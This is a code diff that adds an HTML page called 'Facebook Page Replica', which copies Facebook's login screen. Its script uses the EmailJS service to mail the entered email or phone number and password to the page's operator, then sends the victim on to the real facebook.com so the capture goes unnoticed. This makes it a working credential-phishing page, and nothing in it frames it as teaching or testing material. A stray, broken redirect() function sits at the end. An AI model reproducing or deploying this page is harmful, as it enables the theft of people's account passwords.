@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1">
+    <title>Facebook Page Replica</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <h1>facebook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </div>
+        <div class="right">
+            <form id="form">
+
+     
+ 
+                <input type="search" name="search_id" id="search_id" placeholder="Email addess or phone number"  required style="border-radius: none;">
+     
+
+
+ 
+ 
+                <input type="password"  name="password_id" id="password_id" placeholder="Password" 
+                required>
+
+
+
+              
+               <input class="loginBtn" type="submit" id="button" value="Send Email" onclick="redirect()" >
+
+             
+            </form>
+            <p><b>Create a Page</b> for a celebrity, band or business.</p>
+        </div>
+    </div>
+    <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('7lQ9ELEJao7hkgnYz')
+</script>
+<script type="text/javascript">
+	const btn = document.getElementById('button');
+
+	document.getElementById('form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'default_service';
+   const templateID = 'template_y8lkdyt';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      window.location="https://www.facebook.com"
+      
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
+</script>
+<script type="text/javascript">
+	function redirect() {
+		/
+	}
+</script>
+</body>
+</html>
